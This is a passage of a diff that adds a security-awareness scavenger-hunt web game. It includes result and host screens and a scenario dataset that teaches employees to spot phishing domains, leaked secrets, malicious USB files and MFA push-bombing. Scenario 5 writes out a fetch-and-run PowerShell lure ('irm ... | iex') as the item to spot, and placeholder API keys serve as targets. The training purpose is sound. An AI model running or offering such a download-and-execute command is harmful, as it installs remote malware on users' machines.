+                        <div id="debriefStatusIcon" class="w-12 h-12 rounded-2xl bg-emerald-500/10 border border-emerald-500/40 text-emerald-400 flex items-center justify-center text-2xl shadow-lg">
+                            <i class="fa-solid fa-shield-check"></i>
+                        </div>
+                        <div>
+                            <span id="debriefBadge" class="text-xs font-mono uppercase tracking-wider text-emerald-400 bg-emerald-950/60 border border-emerald-800/80 px-2.5 py-0.5 rounded-full font-bold">
+                                Threat Successfully Neutralized
+                            </span>
+                            <h3 id="debriefTitle" class="text-xl sm:text-2xl font-black text-white mt-1">
+                                Vulnerability Identified
+                            </h3>
+                        </div>
+                    </div>
+
+                    <!-- Paused Timer Badge -->
+                    <div class="bg-slate-950 border border-cyan-500/40 px-4 py-2 rounded-2xl font-mono text-right shadow-inner">
+                        <span class="text-[10px] text-cyan-400 uppercase tracking-widest block font-bold">Clock Paused For Review</span>
+                        <span id="debriefPausedTime" class="text-lg font-black text-cyan-300">00:00</span>
+                    </div>
+                </div>
+
+                <!-- Spotlit Flaw / Correct Answer Card -->
+                <div class="p-4 sm:p-5 rounded-2xl bg-amber-950/30 border-2 border-amber-500/50 space-y-2">
+                    <div class="flex items-center space-x-2 text-xs font-mono uppercase tracking-wider text-amber-400 font-bold">
+                        <i class="fa-solid fa-magnifying-glass-arrow-right"></i>
+                        <span>Exact Vulnerability Spotlight</span>
+                    </div>
+                    <div id="debriefSpotlightContent" class="text-sm sm:text-base font-mono font-bold text-amber-200 bg-slate-950/80 p-3 rounded-xl border border-amber-500/30 select-text">
+                        <!-- Spotlit target text -->
+                    </div>
+                </div>
+
+                <!-- Detailed Educational Analysis -->
+                <div class="space-y-2">
+                    <h4 class="text-xs font-mono uppercase tracking-wider text-slate-400 font-bold">
+                        Threat Analysis & Attack Vector Breakdown:
+                    </h4>
+                    <p id="debriefExplanation" class="text-sm text-slate-300 leading-relaxed bg-slate-950/60 p-4 rounded-2xl border border-slate-800/80">
+                        <!-- Explanatory breakdown -->
+                    </p>
+                </div>
+
+                <!-- Large Security Tip & Workplace Actionable Advice -->
+                <div class="p-4 sm:p-5 rounded-2xl bg-gradient-to-r from-cyan-950/40 via-emerald-950/30 to-cyan-950/40 border border-cyan-500/40 space-y-2">
+                    <div class="flex items-center space-x-2 text-xs font-mono uppercase tracking-wider text-cyan-300 font-bold">
+                        <i class="fa-solid fa-shield-virus text-emerald-400 text-sm"></i>
+                        <span>Security Tip & Defense Protocol</span>
+                    </div>
+                    <p id="debriefSecurityTip" class="text-sm sm:text-base font-semibold text-emerald-100 leading-relaxed">
+                        <!-- Actionable advice -->
+                    </p>
+                </div>
+
+                <!-- Penalty / Attempt Callout -->
+                <div id="debriefPenaltyNotice" class="hidden p-3 bg-rose-950/40 border border-rose-500/40 rounded-xl text-xs font-mono text-rose-300 flex items-center justify-between">
+                    <span><i class="fa-solid fa-triangle-exclamation mr-1.5 text-rose-400"></i> 3 Failed Tries Exceeded:</span>
+                    <span class="font-bold">+30 Seconds Penalty Incurred</span>
+                </div>
+
+                <!-- Continue Button -->
+                <div class="pt-2 flex justify-end">
+                    <button onclick="advanceToNextTask()" class="w-full sm:w-auto px-8 py-3.5 rounded-2xl bg-gradient-to-r from-emerald-500 to-cyan-500 hover:from-emerald-400 hover:to-cyan-400 text-slate-950 font-black font-mono text-xs uppercase tracking-wider shadow-lg shadow-emerald-500/20 active:scale-95 transition flex items-center justify-center space-x-2">
+                        <span>Continue To Next Mission</span>
+                        <i class="fa-solid fa-arrow-right"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- ======================================================== -->
+        <!-- SCREEN 6: Final Results Screen (No Public Leaderboard)   -->
+        <!-- ======================================================== -->
+        <section id="screenResults" class="hidden flex-grow flex flex-col justify-center items-center py-6">
+            <div class="max-w-2xl w-full bg-slate-900/90 border border-slate-800 rounded-3xl p-6 sm:p-10 shadow-2xl text-center space-y-6">
+                <!-- Trophy Icon -->
+                <div class="w-16 h-16 rounded-full bg-cyan-500/10 border border-cyan-500/40 text-cyan-400 flex items-center justify-center text-3xl mx-auto shadow-lg">
+                    <i class="fa-solid fa-flag-checkered"></i>
+                </div>
+
+                <div class="space-y-1">
+                    <span class="text-xs font-mono uppercase tracking-widest text-emerald-400 bg-emerald-950/60 border border-emerald-800/80 px-3 py-1 rounded-full">
+                        MISSION ACCOMPLISHED
+                    </span>
+                    <h2 class="text-2xl sm:text-3xl font-black text-white pt-2">Security Scavenger Hunt Concluded</h2>
+                    <p class="text-xs sm:text-sm text-slate-400">
+                        Excellent performance, Agent <strong id="resultsParticipantName" class="text-cyan-300"></strong> (<span id="resultsParticipantRr" class="font-mono text-amber-300"></span>). Your score and time have been finalized and recorded in the Host War Room.
+                    </p>
+                </div>
+
+                <!-- Individual Metrics Card -->
+                <div class="grid grid-cols-1 sm:grid-cols-3 gap-3 pt-2">
+                    <div class="p-4 rounded-2xl bg-slate-950/80 border border-slate-800 text-center">
+                        <span class="text-[10px] font-mono uppercase text-slate-400 block mb-1">Threats Cleared</span>
+                        <span id="resultsScore" class="text-2xl font-black text-emerald-400 font-mono">0 / 10</span>
+                    </div>
+                    <div class="p-4 rounded-2xl bg-slate-950/80 border border-slate-800 text-center">
+                        <span class="text-[10px] font-mono uppercase text-slate-400 block mb-1">Final Active Time</span>
+                        <span id="resultsTime" class="text-2xl font-black text-cyan-300 font-mono">00:00</span>
+                    </div>
+                    <div class="p-4 rounded-2xl bg-slate-950/80 border border-slate-800 text-center">
+                        <span class="text-[10px] font-mono uppercase text-slate-400 block mb-1">Total Penalties</span>
+                        <span id="resultsPenalties" class="text-2xl font-black text-rose-400 font-mono">+00:00</span>
+                    </div>
+                </div>
+
+                <!-- Single-Entry Locked Banner -->
+                <div class="p-4 bg-slate-950/90 border border-slate-800 rounded-2xl text-xs font-mono text-slate-400 flex items-center justify-center space-x-2">
+                    <i class="fa-solid fa-lock text-amber-400"></i>
+                    <span>Single-Entry Finalized: Your RR ID / WL ID is officially recorded. Retrying is locked.</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- ======================================================== -->
+        <!-- SCREEN 7: Reconnection Pending Host Approval Screen     -->
+        <!-- ======================================================== -->
+        <section id="screenPendingApproval" class="hidden flex-grow flex items-center justify-center py-6">
+            <div class="max-w-xl w-full bg-slate-900/95 border-2 border-amber-500/50 rounded-3xl p-6 sm:p-8 shadow-2xl backdrop-blur-xl text-center space-y-6">
+                <div class="relative w-16 h-16 mx-auto flex items-center justify-center">
+                    <span class="absolute inset-0 rounded-full bg-amber-500/20 animate-ping"></span>
+                    <div class="w-14 h-14 rounded-full bg-amber-500/10 border border-amber-500/40 flex items-center justify-center text-amber-400 text-2xl shadow-lg relative z-10">
+                        <i class="fa-solid fa-user-shield animate-pulse"></i>
+                    </div>
+                </div>
+
+                <div class="space-y-2">
+                    <span class="text-xs font-mono uppercase tracking-widest text-amber-400 bg-amber-950/60 border border-amber-800/80 px-3 py-1 rounded-full">
+                        Interrupted Session Detected
+                    </span>
+                    <h2 class="text-xl sm:text-2xl font-black text-white">Reconnection Pending Host Approval</h2>
+                    <p class="text-xs sm:text-sm text-slate-400 leading-relaxed max-w-md mx-auto">
+                        Participant <strong id="pendingScreenName" class="text-cyan-300"></strong> (<span id="pendingScreenRr" class="font-mono text-amber-300"></span>), your session was disconnected mid-activity. 
+                        A re-entry request has been transmitted to the Host Administrator.
+                    </p>
+                </div>
+
+                <!-- Session State Summary -->
+                <div class="bg-slate-950/90 border border-slate-800 rounded-2xl p-4 text-xs font-mono text-left space-y-2">
+                    <div class="flex justify-between items-center text-slate-400 border-b border-slate-800/80 pb-2">
+                        <span>Disconnect Point:</span>
+                        <span id="pendingScreenTask" class="text-white font-bold">Task #--</span>
+                    </div>
+                    <div class="flex justify-between items-center text-slate-400 border-b border-slate-800/80 pb-2">
+                        <span>Timer at Disconnect:</span>
+                        <span id="pendingScreenTime" class="text-cyan-300 font-bold">00:00</span>
+                    </div>
+                    <div class="flex justify-between items-center text-slate-400">
+                        <span>Score Retained:</span>
+                        <span id="pendingScreenScore" class="text-emerald-400 font-bold">0 / 10</span>
+                    </div>
+                </div>
+
+                <div class="p-3 bg-amber-500/10 border border-amber-500/20 rounded-xl text-xs font-mono text-amber-300/90 flex items-center justify-center gap-2">
+                    <i class="fa-solid fa-circle-notch fa-spin text-amber-400"></i>
+                    <span>Awaiting Host authorization in the War Room...</span>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Host Portal PIN Modal -->
+    <div id="modalHostPin" class="hidden fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-4">
+        <div class="max-w-sm w-full bg-slate-900 border border-slate-700 rounded-3xl p-6 shadow-2xl space-y-4">
+            <div class="flex items-center space-x-3">
+                <div class="w-10 h-10 rounded-xl bg-amber-500/20 text-amber-400 flex items-center justify-center text-lg">
+                    <i class="fa-solid fa-key"></i>
+                </div>
+                <div>
+                    <h3 class="font-bold text-white text-base">Host Portal Verification</h3>
+                    <p class="text-xs text-slate-400 font-mono">Restricted Organizer Access</p>
+                </div>
+            </div>
+            <div>
+                <input type="password" id="inputHostPin" placeholder="Enter Host PIN"
+                    class="w-full px-4 py-3 bg-slate-950 border border-slate-800 focus:border-amber-500 focus:ring-1 focus:ring-amber-500 rounded-xl text-white font-mono text-sm outline-none">
+            </div>
+            <div class="flex items-center justify-end space-x-2 pt-2">
+                <button onclick="closeHostPinModal()" class="px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-mono transition">
+                    Cancel
+                </button>
+                <button onclick="verifyHostPin()" class="px-5 py-2 rounded-xl bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold font-mono text-xs transition">
+                    Authorize Entry
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Generic Custom Message Modal (Replaces browser alert/confirm) -->
+    <div id="modalCustomMessage" class="hidden fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-4">
+        <div class="max-w-md w-full bg-slate-900 border border-slate-700 rounded-3xl p-6 shadow-2xl space-y-4 text-center">
+            <div id="customModalIcon" class="w-12 h-12 rounded-full mx-auto flex items-center justify-center text-2xl">
+                <!-- Icon inserted dynamically -->
+            </div>
+            <h3 id="customModalTitle" class="text-lg font-bold text-white">Notice</h3>
+            <p id="customModalBody" class="text-xs text-slate-300 leading-relaxed"></p>
+            <div class="pt-2">
+                <button onclick="closeCustomModal()" class="w-full py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-white font-mono text-xs font-bold transition">
+                    Acknowledge
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Invite Friends & Share Link Modal -->
+    <div id="modalInvite" class="hidden fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-4">
+        <div class="max-w-md w-full bg-slate-900 border border-slate-700 rounded-3xl p-6 shadow-2xl space-y-4 text-left">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center space-x-2.5">
+                    <div class="w-9 h-9 rounded-xl bg-cyan-950 text-cyan-400 flex items-center justify-center text-sm font-bold">
+                        <i class="fa-solid fa-share-nodes"></i>
+                    </div>
+                    <h3 class="font-bold text-white text-base">Invite Participants</h3>
+                </div>
+                <button onclick="closeInviteModal()" class="text-slate-400 hover:text-white text-sm">
+                    <i class="fa-solid fa-xmark"></i>
+                </button>
+            </div>
+
+            <p class="text-xs text-slate-300">
+                Share this session link or scan the QR code to join the live waiting lobby from another browser or device.
+            </p>
+
+            <!-- Live QR Code -->
+            <div class="p-3 bg-white rounded-2xl w-36 h-36 mx-auto flex items-center justify-center shadow-lg">
+                <img id="qrCodeImage" src="" alt="Session QR Code" class="w-full h-full object-contain">
+            </div>
+
+            <!-- Copyable URL Field -->
+            <div class="flex items-center space-x-2">
+                <input type="text" id="inputInviteUrl" readonly
+                    class="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-slate-300 font-mono text-xs outline-none">
+                <button onclick="copyInviteLink()" class="px-3 py-2 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold font-mono text-xs shrink-0 transition">
+                    Copy
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast Notification Container -->
+    <div id="toastContainer" class="fixed bottom-5 right-5 z-50 flex flex-col space-y-2 pointer-events-none"></div>
+
+    <script>
+        /* ======================================================== */
+        /* SCENARIO DATASET: 10 Real-World Security Scenarios        */
+        /* ======================================================== */
+        const SCENARIOS = [
+            {
+                id: 1,
+                title: "Phishing Email: Fake Corporate IT Security Alert",
+                category: "Social Engineering / Email",
+                objective: "Spot the specific deception flaw in the email sender or header details.",
+                hint: "Inspect the email address after the '@' sign carefully. Attackers often add duplicate letters (typosquatting).",
+                targetValue: "IT Support <admin@corpp-security-portal.com>",
+                explanation: "The sender domain is 'corpp-security-portal.com' with a double 'p'. Authentic corporate notices originate from your registered company domain, not newly registered lookalike portals.",
+                securityTip: "Always scrutinize the sender domain after the '@' symbol before complying with urgent password resets or security mandates.",
+                render: function(targetFn, decoyFn) {
+                    return `
+                        <div class="bg-slate-950 border border-slate-800 rounded-2xl p-4 sm:p-6 space-y-4 font-sans text-xs">
+                            <div class="border-b border-slate-800 pb-3 space-y-1.5 font-mono">
+                                <div class="flex items-center">
+                                    <span class="text-slate-500 w-16">From:</span>
+                                    <span onclick="${targetFn}" class="hunt-target font-mono text-slate-200">IT Support &lt;admin@corpp-security-portal.com&gt;</span>
+                                </div>
+                                <div class="flex items-center">
+                                    <span class="text-slate-500 w-16">To:</span>
+                                    <span onclick="${decoyFn}" class="hunt-decoy font-mono text-slate-300">employee@organization.com</span>
+                                </div>
+                                <div class="flex items-center">
+                                    <span class="text-slate-500 w-16">Subject:</span>
+                                    <span onclick="${decoyFn}" class="hunt-decoy font-mono text-rose-300 font-bold">[CRITICAL] Mandatory Endpoint Security Patch v4.2</span>
+                                </div>
+                                <div class="flex items-center">
+                                    <span class="text-slate-500 w-16">Date:</span>
+                                    <span onclick="${decoyFn}" class="hunt-decoy font-mono text-slate-400">Oct 08, 2026, 09:14 AM</span>
+                                </div>
+                            </div>
+                            <div class="space-y-3 text-slate-300 leading-relaxed font-sans">
+                                <p onclick="${decoyFn}" class="hunt-decoy">Dear Valued Employee,</p>
+                                <p onclick="${decoyFn}" class="hunt-decoy">Our zero-day telemetry detected an unpatched vulnerability on your workstation. Failure to authenticate and install this certificate within 2 hours will result in directory lockout.</p>
+                                <div class="pt-2">
+                                    <span onclick="${decoyFn}" class="hunt-decoy inline-block px-5 py-2.5 rounded-xl bg-cyan-600/30 border border-cyan-500/50 text-cyan-300 font-mono font-bold">Download Security Patch Installer</span>
+                                </div>
+                                <p onclick="${decoyFn}" class="hunt-decoy text-slate-500 text-[11px] pt-2">Global Information Security Services &bull; Automated Ticket #9021</p>
+                            </div>
+                        </div>
+                    `;
+                }
+            },
+            {
+                id: 2,
+                title: "Spoofed Single Sign-On (SSO) Portal URL",
+                category: "Browser & Domain Security",
+                objective: "Identify the deceptive domain in the browser address bar.",
+                hint: "Look at the numbers substituted for letters in the domain name (lookalike character substitution).",
+                targetValue: "https://login.micros0ft-online-auth.com/oauth2/v2.0/authorize",
+                explanation: "The domain uses a zero ('0') instead of 'o' in 'micros0ft-online-auth.com'. Attackers use homoglyph/typosquatting domains to harvest multi-factor credentials.",
+                securityTip: "Verify the domain name spelling in your browser bar before typing enterprise passwords, or utilize password manager autofill which refuses spoofed domains.",
+                render: function(targetFn, decoyFn) {
+                    return `
+                        <div class="bg-slate-950 border border-slate-800 rounded-2xl p-4 sm:p-5 space-y-4">
+                            <!-- Browser Navigation Bar -->
+                            <div class="bg-slate-900 border border-slate-800 rounded-xl p-2.5 flex items-center space-x-2 font-mono text-xs">
+                                <div class="flex space-x-1.5 px-1">
+                                    <span class="w-2.5 h-2.5 rounded-full bg-rose-500/70"></span>
+                                    <span class="w-2.5 h-2.5 rounded-full bg-amber-500/70"></span>
+                                    <span class="w-2.5 h-2.5 rounded-full bg-emerald-500/70"></span>
+                                </div>
+                                <div class="flex-grow bg-slate-950 border border-slate-800 rounded-lg px-3 py-1 flex items-center space-x-2">
+                                    <i class="fa-solid fa-lock text-emerald-400 text-xs"></i>
+                                    <span onclick="${targetFn}" class="hunt-target font-mono text-slate-200">https://login.micros0ft-online-auth.com/oauth2/v2.0/authorize</span>
+                                </div>
+                                <i onclick="${decoyFn}" class="hunt-decoy fa-solid fa-rotate-right text-slate-400 px-1"></i>
+                            </div>
+
+                            <!-- Fake Login Modal Simulation -->
+                            <div class="max-w-sm mx-auto bg-slate-900/90 border border-slate-800 p-5 rounded-2xl space-y-3 text-xs">
+                                <div class="flex items-center space-x-2 mb-2">
+                                    <div class="w-5 h-5 grid grid-cols-2 gap-0.5">
+                                        <div class="bg-rose-500"></div><div class="bg-emerald-500"></div>
+                                        <div class="bg-cyan-500"></div><div class="bg-amber-500"></div>
+                                    </div>
+                                    <span onclick="${decoyFn}" class="hunt-decoy font-bold text-white font-sans">Single Sign-On Authentication</span>
+                                </div>
+                                <div onclick="${decoyFn}" class="hunt-decoy bg-slate-950 p-2.5 rounded-lg border border-slate-800 text-slate-400">username@company.com</div>
+                                <div onclick="${decoyFn}" class="hunt-decoy bg-slate-950 p-2.5 rounded-lg border border-slate-800 text-slate-500">&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;</div>
+                                <button onclick="${decoyFn}" class="hunt-decoy w-full py-2 bg-blue-600 rounded-lg text-white font-bold">Sign In</button>
+                            </div>
+                        </div>
+                    `;
+                }
+            },
+            {
+                id: 3,
+                title: "Physical Workstation & Clean Desk Policy Breach",
+                category: "Physical Security",
+                objective: "Spot the physical security violation on the office workstation.",
+                hint: "Examine the monitor frame and desk surface for exposed sensitive credentials.",
+                targetValue: "Sticky Note: VPN Pass: Winter2024!",
+                explanation: "Writing login credentials on a sticky note pasted to a monitor is a severe clean-desk violation that exposes enterprise systems to unauthorized walk-by personnel or visitors.",
+                securityTip: "Never record passwords on physical notes. Always use an enterprise password vault protected by multi-factor authentication.",
+                render: function(targetFn, decoyFn) {
+                    return `
+                        <div class="bg-slate-950 border border-slate-800 rounded-2xl p-6 relative font-sans text-xs">
+                            <div class="max-w-md mx-auto bg-slate-900 border-4 border-slate-800 rounded-2xl p-6 shadow-2xl relative">
+                                <!-- Monitor Screen Area -->
+                                <div class="bg-slate-950 border border-slate-800 rounded-xl p-4 text-center space-y-2 mb-4">
+                                    <i class="fa-solid fa-desktop text-3xl text-slate-600"></i>
+                                    <p onclick="${decoyFn}" class="hunt-decoy text-slate-400 font-mono text-[11px]">Workstation 14-B &bull; Locked Console</p>
+                                </div>
+
+                                <!-- Sticky Note 1: Harmless Task -->
+                                <div onclick="${decoyFn}" class="hunt-decoy inline-block p-2.5 bg-yellow-300 text-slate-900 font-mono text-[11px] rounded shadow-md m-1">
+                                    Standup meeting @ 10:30 AM
+                                </div>
+
+                                <!-- Sticky Note 2: Security Breach Target -->
+                                <div onclick="${targetFn}" class="hunt-target inline-block p-2.5 bg-yellow-300 text-slate-900 font-mono text-[11px] rounded shadow-md m-1">
+                                    VPN Pass: Winter2024!
+                                </div>
+
+                                <!-- Sticky Note 3: Harmless Ticket -->
+                                <div onclick="${decoyFn}" class="hunt-decoy inline-block p-2.5 bg-yellow-300 text-slate-900 font-mono text-[11px] rounded shadow-md m-1">
+                                    Printer IP: 192.168.1.42
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                }
+            },
+            {
+                id: 4,
+                title: "Social Media Oversharing & OSINT Exposure",
+                category: "Open Source Intelligence (OSINT)",
+                objective: "Spot the sensitive confidential data leaked in the employee desk photo.",
+                hint: "Look at the items in the background behind the desk celebration.",
+                targetValue: "Whiteboard: Prod AWS API Key: AKIA-EXPOSED-9921",
+                explanation: "The background whiteboard displays a live AWS production API key. Attackers routinely harvest employee social media posts to extract internal infrastructure keys.",
+                securityTip: "Inspect all photographs for visible whiteboards, screens, or badges before publishing images on LinkedIn or public platforms.",
+                render: function(targetFn, decoyFn) {
+                    return `
+                        <div class="bg-slate-950 border border-slate-800 rounded-2xl p-5 space-y-4 font-sans text-xs">
+                            <div class="flex items-center space-x-2 border-b border-slate-800 pb-3">
+                                <i class="fa-brands fa-linkedin text-blue-400 text-base"></i>
+                                <span onclick="${decoyFn}" class="hunt-decoy font-bold text-white">LinkedIn Post &bull; Sarah Jenkins (DevOps Lead)</span>
+                            </div>
+                            <p onclick="${decoyFn}" class="hunt-decoy text-slate-300 leading-relaxed">
+                                "Proud to celebrate 3 years with our amazing engineering team! Here's a quick snap of our collaborative sprint room!"
+                            </p>
+                            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3 p-4 bg-slate-900 rounded-2xl border border-slate-800">
+                                <div onclick="${decoyFn}" class="hunt-decoy p-3 bg-slate-950 rounded-xl border border-slate-800 text-slate-400 font-mono">
+                                    Sprint Goal: Launch v2.4 Microservice
+                                </div>
+                                <div onclick="${targetFn}" class="hunt-target p-3 bg-slate-950 rounded-xl border border-slate-800 text-slate-300 font-mono">
+                                    Whiteboard: Prod AWS API Key: AKIA-EXPOSED-9921
+                                </div>
+                                <div onclick="${decoyFn}" class="hunt-decoy p-3 bg-slate-950 rounded-xl border border-slate-800 text-slate-400 font-mono">
+                                    Team Milestone: 99.9% Uptime Reached
+                                </div>
+                                <div onclick="${decoyFn}" class="hunt-decoy p-3 bg-slate-950 rounded-xl border border-slate-800 text-slate-400 font-mono">
+                                    Coffee Machine: Clean filter daily
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                }
+            },
+            {
+                id: 5,
+                title: "Malicious Video Codec & Drive-By Plugin Prompt",
+                category: "Malware / Web Delivery",
+                objective: "Spot the deceptive lure claiming a proprietary codec is required.",
+                hint: "Legitimate modern web browsers do not require downloading third-party .exe or powershell scripts to join calls.",
+                targetValue: "Run PowerShell Fix: irm codec-patch.com/v4.ps1 | iex",
+                explanation: "The prompt instructs the user to execute an untrusted PowerShell script directly into their terminal ('irm | iex' attack). This immediately downloads and runs remote malware in memory.",
+                securityTip: "Never copy and paste PowerShell commands or terminal scripts from browser prompts claiming to fix audio/video issues.",
+                render: function(targetFn, decoyFn) {
+                    return `
+                        <div class="bg-slate-950 border border-slate-800 rounded-2xl p-6 font-sans text-xs space-y-4">
+                            <div class="max-w-md mx-auto bg-slate-900 border border-slate-800 rounded-2xl p-5 space-y-4">
+                                <div class="flex items-center space-x-3 text-amber-400">
+                                    <i class="fa-solid fa-triangle-exclamation text-xl"></i>
+                                    <span onclick="${decoyFn}" class="hunt-decoy font-bold text-white text-sm">Conference Audio Codec Missing</span>
+                                </div>
+                                <p onclick="${decoyFn}" class="hunt-decoy text-slate-300 leading-relaxed">
+                                    Your web browser cannot decode the incoming encrypted corporate stream. Choose an option to resolve this issue:
+                                </p>
+                                <div class="space-y-2 font-mono">
+                                    <div onclick="${decoyFn}" class="hunt-decoy p-3 bg-slate-950 rounded-xl border border-slate-800 text-slate-400">
+                                        Option A: Switch to telephone audio
+                                    </div>
+                                    <div onclick="${targetFn}" class="hunt-target p-3 bg-slate-950 rounded-xl border border-slate-800 text-slate-300">
+                                        Run PowerShell Fix: irm codec-patch.com/v4.ps1 | iex
+                                    </div>
+                                    <div onclick="${decoyFn}" class="hunt-decoy p-3 bg-slate-950 rounded-xl border border-slate-800 text-slate-400">
+                                        Option C: Request meeting host reschedule
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                }
+            },
+            {
+                id: 6,
+                title: "USB Drop Attack & Autorun Weaponization",
+                category: "Removable Media",
+                objective: "Spot the dangerous executable disguised as a business spreadsheet.",
+                hint: "Check the double file extensions on the removable storage files.",
+                targetValue: "Executive_Bonuses_Q3.xlsx.exe",
+                explanation: "The file uses double extensions ('xlsx.exe') to masquerade as an Excel spreadsheet while being an executable binary program designed to drop ransomware.",
+                securityTip: "Never plug in unknown USB drives found in parking lots or lobbies, and ensure file extensions are always made visible in operating system settings.",
+                render: function(targetFn, decoyFn) {
+                    return `
+                        <div class="bg-slate-950 border border-slate-800 rounded-2xl p-5 space-y-4 font-mono text-xs">
+                            <div class="flex items-center space-x-2 border-b border-slate-800 pb-3 text-slate-400">
+                                <i class="fa-solid fa-usb text-cyan-400"></i>
+                                <span onclick="${decoyFn}" class="hunt-decoy">USB Drive (E:) &bull; Found near Building Lobby</span>
+                            </div>
+                            <div class="space-y-2">
+                                <div onclick="${decoyFn}" class="hunt-decoy p-3 bg-slate-900 rounded-xl border border-slate-800 flex items-center space-x-3 text-slate-400">
+                                    <i class="fa-regular fa-file-pdf text-rose-400"></i>
+                                    <span>Employee_Handbook_2026.pdf</span>
+                                </div>
+                                <div onclick="${targetFn}" class="hunt-target p-3 bg-slate-900 rounded-xl border border-slate-800 flex items-center space-x-3 text-slate-200">
+                                    <i class="fa-regular fa-file-excel text-emerald-400"></i>
+                                    <span>Executive_Bonuses_Q3.xlsx.exe</span>
+                                </div>
+                                <div onclick="${decoyFn}" class="hunt-decoy p-3 bg-slate-900 rounded-xl border border-slate-800 flex items-center space-x-3 text-slate-400">
+                                    <i class="fa-regular fa-file-word text-blue-400"></i>
+                                    <span>Travel_Expense_Template.docx</span>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                }
+            },
+            {
+                id: 7,
+                title: "MFA Fatigue & Push-Bombing Authorization",
+                category: "Identity & Authentication",
+                objective: "Spot the anomalous foreign location in the repeated authentication push request.",
+                hint: "Check the geographic origin of the sign-in attempt.",
+                targetValue: "Location: St. Petersburg, Russian Federation",
+                explanation: "The prompt originates from an unexpected foreign country (St. Petersburg, Russia) while the employee works domestically. Approving this notification grants unauthorized entry to an attacker who compromised credentials.",
+                securityTip: "Never approve an unexpected MFA push prompt. Always tap 'Deny / Report Fraud' and notify your cybersecurity response team immediately.",
+                render: function(targetFn, decoyFn) {
+                    return `
+                        <div class="bg-slate-950 border border-slate-800 rounded-2xl p-6 font-sans text-xs">
+                            <div class="max-w-sm mx-auto bg-slate-900 border border-slate-800 rounded-2xl p-5 space-y-4 text-center">
+                                <i class="fa-solid fa-mobile-screen-button text-3xl text-cyan-400"></i>
+                                <div>
+                                    <h4 onclick="${decoyFn}" class="hunt-decoy font-bold text-white text-sm">Authenticator Push Request</h4>
+                                    <p onclick="${decoyFn}" class="hunt-decoy text-slate-400 text-[11px] mt-1">Prompt #14 in last 5 minutes</p>
+                                </div>
+                                <div class="bg-slate-950 p-3 rounded-xl border border-slate-800 text-left font-mono space-y-1.5 text-[11px]">
+                                    <div onclick="${decoyFn}" class="hunt-decoy text-slate-400">Account: user.emp@globalcorp.com</div>
+                                    <div onclick="${decoyFn}" class="hunt-decoy text-slate-400">Device: Chrome on Linux x86_64</div>
+                                    <div onclick="${targetFn}" class="hunt-target text-slate-200">Location: St. Petersburg, Russian Federation</div>
+                                </div>
+                                <div class="grid grid-cols-2 gap-2 pt-2 font-mono">
+                                    <button onclick="${decoyFn}" class="hunt-decoy py-2 bg-rose-600/30 border border-rose-500/50 rounded-xl text-rose-300 font-bold">Deny</button>
+                                    <button onclick="${decoyFn}" class="hunt-decoy py-2 bg-emerald-600/30 border border-emerald-500/50 rounded-xl text-emerald-300 font-bold">Approve</button>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                }
+            },
+            {
+                id: 8,
+                title: "Hardcoded Secret in Git Code Commit",
+                category: "Application Security / DevSecOps",
+                objective: "Spot the unmasked private API credential committed to source control.",
+                hint: "Scan for hardcoded secret strings, tokens, or private keys directly in the code.",
+                targetValue: 'const STRIPE_SECRET = "sk_live_51M0xABC99887766SecureTokenExposed";',
+                explanation: "The developer committed a live production API secret ('sk_live_...') directly into the code repository instead of using environment variables or a secrets manager.",
+                securityTip: "Never commit credentials or tokens to Git. Use pre-commit scanning hooks (like git-secrets or TruffleHog) to prevent secret leakage.",
+                render: function(targetFn, decoyFn) {
+                    return `
+                        <div class="bg-slate-950 border border-slate-800 rounded-2xl p-5 space-y-3 font-mono text-xs">
+                            <div class="flex items-center justify-between border-b border-slate-800 pb-2 text-slate-400">
+                                <span onclick="${decoyFn}" class="hunt-decoy">Commit: feat(billing): integrate payment provider</span>
+                                <span onclick="${decoyFn}" class="hunt-decoy text-[11px]">branch: master</span>
+                            </div>
+                            <div class="space-y-1 bg-slate-900/80 p-4 rounded-xl border border-slate-800 leading-relaxed overflow-x-auto">
+                                <div onclick="${decoyFn}" class="hunt-decoy text-slate-400">import { PaymentClient } from '@corporate/billing';</div>
+                                <div onclick="${decoyFn}" class="hunt-decoy text-slate-400">const RETRY_ATTEMPTS = 3;</div>
+                                <div onclick="${targetFn}" class="hunt-target text-slate-200">const STRIPE_SECRET = "sk_live_51M0xABC99887766SecureTokenExposed";</div>
+                                <div onclick="${decoyFn}" class="hunt-decoy text-slate-400">export async function processOrder(orderId, amount) {</div>
+                                <div onclick="${decoyFn}" class="hunt-decoy text-slate-400">&nbsp;&nbsp;return await PaymentClient.charge({ orderId, amount });</div>
+                                <div onclick="${decoyFn}" class="hunt-decoy text-slate-400">}</div>
+                            </div>
+                        </div>
+                    `;
+                }
+            },
+            {
+                id: 9,
+                title: "Rogue Access Point & Evil Twin Wi-Fi",
+                category: "Wireless & Network Defense",
+                objective: "Spot the suspicious unsecured clone Wi-Fi network.",
+                hint: "Look for open, unencrypted networks mimicking the official enterprise SSID.",
+                targetValue: "Company_Guest_Free_HighSpeed (Open - No Password)",
+                explanation: "Attackers deploy 'Evil Twin' rogue Wi-Fi access points with names like 'Company_Guest_Free' without encryption to intercept and tamper with employee network traffic via Man-In-The-Middle (MITM) attacks.",
+                securityTip: "Only connect to verified corporate WPA3-Enterprise networks or use an approved corporate VPN when connecting from guest Wi-Fi.",
